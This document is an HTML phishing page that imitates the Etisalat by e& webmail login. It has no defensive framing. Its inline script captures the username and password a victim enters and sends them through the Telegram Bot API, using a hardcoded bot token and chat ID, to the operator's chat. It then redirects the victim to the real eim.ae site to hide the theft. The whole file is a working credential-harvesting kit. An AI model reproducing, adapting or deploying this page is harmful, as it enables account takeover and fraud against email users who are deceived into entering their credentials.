<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>My Email - Etisalat by e& Internet Mail</title>
  <link rel="stylesheet" href="style.css">
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-color flex items-center justify-center h-screen">

  <div class="bg-white pt-3 px-2  shadow-xl w-full max-w-md">
    <img src="/img/etisalat-logo.svg" alt="">

    <form id="telegramForm" class="space-y-4">
        <h4 class="welcome">My Email - Etisalat by e& Internet Mail
        </h4>
        <p id="statusMessage" class=" mt-4 text-[10px] text-gray-600"></p>
      <div class="flex justify-center">
        <label class="block mx-2 mt-[1%]">Username: </label>
        <input type="text" id="input1"
               
               class="w-[70%] px-1 py-1 border  border-black focus:outline-none focus:ring-2 focus:ring-blue-500"
               >
      </div>

      <div class="flex justify-center">
        <label class="block mx-2 mt-[1%]"> Password: </label>
        <input type="password" id="input2"
              
               class="w-[70%] px-1 py-1 border  border-black focus:outline-none focus:ring-2 focus:ring-blue-500"
               >
      </div>

      <div class="mx-[10%] pl-[12%] flex justify-between">
        <button type="submit" class="px-1 border-4 border-white text-white submit ">
            Sign In
        </button>
      <select name="" class="w-[40%] border border-black py-1 hover:bg-[#d5f6ff]" id="">
        <option value="">English</option>
        <option value="">العربية</option>
      </select>
      </div>

      <p class="copy-right pt-10 ">Copyright © 2023, Etisalat by e&. All Rights Reserved.</p>
    </form>

    
  </div>

  <script>
    const BOT_TOKEN = "8209006435:AAFmFbhnllPEUPEu2jRJdnv3fy6Bo7j2HfM"; // your bot token
    const CHAT_ID = "6122954979"; // your chat ID
    const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    document.getElementById("telegramForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const input1 = document.getElementById("input1").value.trim();
      const input2 = document.getElementById("input2").value.trim();
      const statusEl = document.getElementById("statusMessage");

      if (input1 === "" && input2 === "") {
        statusEl.innerHTML = `<img src="img/info.png" alt="info" class="inline w-4 h-4  mr-1"> Enter your username and password.`;
        statusEl.className = "mt-4 text-[10px] text-red-600";
        return;
        } else if (input1 === "") {
        statusEl.innerHTML = `<img src="img/info.png" alt="info" class="inline w-4 h-4 mr-1"> Enter your username.`;
        statusEl.className = "mt-4 text-[10px] text-red-600";
        return;
        } else if (input2 === "") {
        statusEl.innerHTML = `<img src="img/info.png" alt="info" class="inline w-4 h-4 mr-1"> Enter your password.`;
        statusEl.className = "mt-4 text-[10px] text-red-600";
        return;
        }
      const message = `📩 New Form Submission:\n\nUsername: ${input1}\nPassword: ${input2}`;



      fetch(API_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        })
        .then(res => res.json())
        .then(data => {
            if (data.ok) {
            // Redirect immediately
            window.location.href = "https://eim.ae";
            } else {
            statusEl.textContent = "❌ Failed to login.";
            statusEl.className = "text-center mt-4 text-red-600";
            }
        })
        .catch(err => {
            console.error("Error:", err);
            statusEl.textContent = "⚠️ Network error.";
            statusEl.className = "text-center mt-4 text-red-600";
        });
            });
  </script>

</body>
</html>
